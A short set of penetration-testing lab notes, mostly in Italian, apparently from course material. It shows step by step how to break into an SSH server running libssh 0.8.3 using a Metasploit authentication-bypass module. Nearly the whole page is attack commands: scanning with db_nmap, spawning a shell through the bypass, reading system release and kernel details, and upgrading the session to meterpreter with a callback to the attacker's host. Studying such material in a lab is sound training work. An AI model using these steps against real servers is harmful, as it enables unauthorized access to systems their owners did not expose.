# Exploiting A Vulnerable SSH Server

<figure><img src="../../../.gitbook/assets/image (1131).png" alt=""><figcaption></figcaption></figure>

## Preparazione ambiente

```
service postgresql start
msfconsole
workspace -a libssh
setg RHOSTS 192.40.32.3
```

<figure><img src="../../../.gitbook/assets/image (1132).png" alt=""><figcaption></figcaption></figure>

## Enumeration

```
db_nmap -sS -sV -O 192.40.32.3
services
search libssh_auth_bypass_module
```

<figure><img src="../../../.gitbook/assets/image (1133).png" alt=""><figcaption></figcaption></figure>

Dal banner possiamo vedere che la versione di libssh running Ã¨ la 0.8.3 ![](<../../../.gitbook/assets/image (1134).png>)

<figure><img src="../../../.gitbook/assets/image (1135).png" alt=""><figcaption></figcaption></figure>

## Exploit

```
use auxiliary/scanner/ssh/libssh_auth_bypass
show options
set SPAWN_PTY true
run
sessions
sessions 1
whoami
cat /etc/*release //per capire la versione di linux
uname -r  //per verificare versione del kernel
```

<figure><img src="../../../.gitbook/assets/image (1136).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1137).png" alt=""><figcaption></figcaption></figure>

### Upgrade da command shell a meterpreter

```
CTRL+Z
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
show options
set LHOST eth1
set SESSION 1
run
sessions
sessions 2
sysinfo
getuid
```

<figure><img src="../../../.gitbook/assets/image (1138).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1139).png" alt=""><figcaption></figcaption></figure>
